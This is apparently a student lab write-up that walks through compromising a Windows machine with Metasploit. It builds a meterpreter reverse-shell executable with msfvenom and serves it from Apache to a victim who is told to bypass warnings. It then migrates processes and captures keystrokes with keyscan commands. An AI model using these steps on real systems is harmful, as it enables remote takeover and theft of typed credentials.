# Compromising-windows-using-Metasploit
# AIM:
To Compromise windows using Metasploit .
## DESIGN STEPS:

- `Step 1:` Install kali linux either in partition or virtual box or in live mode
- `Step 2:` Investigate on the various categories of tools as follows:
- `Step 3:` Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/9c3d7291-13ee-4451-a8de-4eefe7880320)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/9e30c9c8-c0fa-409b-afaa-01d2399ccf6b)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/80219c7a-92db-4638-a861-054a30a2b399)

Start apache server sudo systemctl apache2 start

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/c2faf12b-9b74-4043-ad3b-6acf3eaf4f7b)

Check the status of apache2

1

Invoke msfconsole:
msfconsole

![WhatsApp Image 2024-04-28 at 11 38 36_53dc1558](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/85861281-56c3-4923-b6a7-72b3599b29f8)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/da78634f-3b70-42c8-8505-6cb242d59e20)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/6df5750f-0811-453a-8627-c83bb1ea4e05)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/6f0ae1cd-4e4a-4846-99ae-ad092f781740)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/d00ef273-1af2-455b-b3bb-e038d8ca7a9c)

On kali give the command exploit

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/164885b8-8377-49fc-9d93-1a2af179a611)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/c015c874-f9a6-46a7-a453-d03c6c079313)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/e27ee98b-24c7-4012-a12e-9960b8c21f53)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/1c6030a8-eb8e-47bb-ab1f-1befe12bbc18)

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/5b6cc1cd-932d-4731-8da6-54e5554d9ac6)

keyscan_dump Shows the keystrokes captured so far.

![image](https://github.com/chandrumathiyazhagan/Compromising-windows-using-Metasploit/assets/119393023/9406a409-6697-469b-901c-8df853263a81)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
